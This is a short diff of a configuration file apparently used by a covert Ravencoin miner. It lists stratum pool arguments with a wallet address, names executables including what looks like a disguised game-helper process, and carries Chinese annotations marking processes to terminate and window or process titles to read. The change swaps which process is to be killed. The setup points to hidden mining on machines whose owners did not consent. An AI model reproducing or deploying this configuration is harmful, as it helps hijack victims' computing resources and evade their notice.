@@ -15,7 +15,7 @@ A5A-- -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM9
 A6A-- -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM99BSdJMjL7WC1Az.mr14@pplns -i 15 -p x--A6A
 A9A--ON1--A9A
 A0A--\TP5Helper.exe--A0A
-A8A--TASL111ogin.exe--A8A---需要终止
+A8A--TP5Helper.exe--A8A---需要终止
 B1B--sfdgefggfdgsdrgdfgcxvbdfg--B1B---取邮标题名
 B2B--sfdgefggfdgsdrgdfgcxvbdfg--B2B---取标题名
 B3B--取取取取取取取取取取--B3B---取邮进程
